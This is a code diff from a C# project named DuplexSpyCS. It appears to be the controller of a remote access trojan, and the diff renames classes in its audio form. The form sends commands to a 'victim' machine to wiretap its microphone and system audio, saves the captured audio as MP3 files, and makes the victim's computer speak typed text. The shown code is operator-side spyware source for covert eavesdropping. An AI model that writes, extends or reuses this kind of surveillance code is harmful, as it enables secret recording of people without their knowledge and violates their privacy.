@@ -17,7 +17,7 @@ namespace DuplexSpyCS
 {
     public partial class frmAudio : Form
     {
-        public Victim v;
+        public clsVictim v;
 
         private WaveInEvent wave_in;
         private WaveOutEvent wave_out;
@@ -44,7 +44,7 @@ namespace DuplexSpyCS
             InitializeComponent();
         }
 
-        private void Received(Listener l, Victim v, string[] cmd)
+        private void Received(clsTcpListener l, clsVictim v, string[] cmd)
         {
             try
             {
@@ -75,7 +75,7 @@ namespace DuplexSpyCS
                 else if (cmd[0] == "wiretap")
                 {
                     int code = int.Parse(cmd[4]);
-                    string msg = Crypto.b64D2Str(cmd[5]);
+                    string msg = clsCrypto.b64D2Str(cmd[5]);
 
                     if (code == 0)
                     {
@@ -323,7 +323,7 @@ namespace DuplexSpyCS
         //SPEECH TEXT
         private void button2_Click(object sender, EventArgs e)
         {
-            v.encSend(2, 0, "audio|speak|text|" + Crypto.b64E2Str(textBox1.Text) + "|" + trackBar1.Value.ToString());
+            v.encSend(2, 0, "audio|speak|text|" + clsCrypto.b64E2Str(textBox1.Text) + "|" + trackBar1.Value.ToString());
         }
 
         //START/STOP BUGGING MICROPHONE
@@ -355,12 +355,12 @@ namespace DuplexSpyCS
                 if (!Directory.Exists(dir))
                     Directory.CreateDirectory(dir);
 
-                string mp3File = Path.Combine(dir, "mic_" + C1.GenerateFileName("mp3"));
+                string mp3File = Path.Combine(dir, "mic_" + clsTools.GenerateFileName("mp3"));
                 mic_mp3FileStream = new FileStream(mp3File, FileMode.Create);
                 mic_mp3Writer = new LameMP3FileWriter(mic_mp3FileStream, new WaveFormat(44100, 1), LAMEPreset.VBR_90);
                 micRecord = true;
 
-                v.SendCommand($"audio|wiretap|micro|{(checkBox1.Checked ? "off" : "on")}|write|1|{Crypto.b64E2Str(textBox2.Text)}");
+                v.SendCommand($"audio|wiretap|micro|{(checkBox1.Checked ? "off" : "on")}|write|1|{clsCrypto.b64E2Str(textBox2.Text)}");
 
                 button5.Text = "Stop Record";
             }
@@ -371,7 +371,7 @@ namespace DuplexSpyCS
                 mic_mp3Writer = null;
                 micRecord = false;
 
-                v.SendCommand($"audio|wiretap|micro|off|write|0|{Crypto.b64E2Str(textBox2.Text)}");
+                v.SendCommand($"audio|wiretap|micro|off|write|0|{clsCrypto.b64E2Str(textBox2.Text)}");
 
                 button5.Text = "Record";
             }
@@ -405,12 +405,12 @@ namespace DuplexSpyCS
                 if (!Directory.Exists(dir))
                     Directory.CreateDirectory(dir);
 
-                string mp3File = Path.Combine(dir, "sys_" + C1.GenerateFileName("mp3"));
+                string mp3File = Path.Combine(dir, "sys_" + clsTools.GenerateFileName("mp3"));
                 sys_mp3FileStream = new FileStream(mp3File, FileMode.Create);
                 sys_mp3Writer = new LameMP3FileWriter(sys_mp3FileStream, new WaveFormat(44100, 1), LAMEPreset.VBR_90);
                 sysRecord = true;
 
-                v.SendCommand($"audio|wiretap|system|{(checkBox2.Checked ? "off" : "on")}|write|1|{Crypto.b64E2Str(textBox3.Text)}");
+                v.SendCommand($"audio|wiretap|system|{(checkBox2.Checked ? "off" : "on")}|write|1|{clsCrypto.b64E2Str(textBox3.Text)}");
 
                 button6.Text = "Stop Record";
             }
@@ -421,7 +421,7 @@ namespace DuplexSpyCS
                 sys_mp3Writer = null;
                 sysRecord = false;
 
-                v.SendCommand($"audio|wiretap|system|off|write|0|{Crypto.b64E2Str(textBox3.Text)}");
+                v.SendCommand($"audio|wiretap|system|off|write|0|{clsCrypto.b64E2Str(textBox3.Text)}");
 
                 button6.Text = "Record";
             }
@@ -480,8 +480,8 @@ namespace DuplexSpyCS
 
                 v.SendCommand($"audio|wiretap|micro|on|stop|Microphone|{comboBox1.SelectedIndex}");
 
-                settingConfig = C1.GetConfigFromINI();
-                CountdownTimer timer = new CountdownTimer(nTimeout / 1000);
+                settingConfig = clsTools.GetConfigFromINI();
+                clsCountdownTimer timer = new clsCountdownTimer(nTimeout / 1000);
                 timer.CountdownCompleted += () =>
                 {
                     if (dicAction.ContainsKey(szKey))
@@ -557,8 +557,8 @@ namespace DuplexSpyCS
                     });
                 };
 
-                settingConfig = C1.GetConfigFromINI();
-                CountdownTimer timer = new CountdownTimer(nTimeout / 1000);
+                settingConfig = clsTools.GetConfigFromINI();
+                clsCountdownTimer timer = new clsCountdownTimer(nTimeout / 1000);
                 timer.CountdownCompleted += () =>
                 {
                     if (dicAction.ContainsKey(szKey))
@@ -574,12 +574,12 @@ namespace DuplexSpyCS
 
         private void button13_Click(object sender, EventArgs e)
         {
-            textBox2.Text = C1.GenerateFileName("wav");
+            textBox2.Text = clsTools.GenerateFileName("wav");
         }
 
         private void button14_Click(object sender, EventArgs e)
         {
-            textBox3.Text = C1.GenerateFileName("wav");
+            textBox3.Text = clsTools.GenerateFileName("wav");
         }
 
         private void frmAudio_FormClosed(object sender, FormClosedEventArgs e)
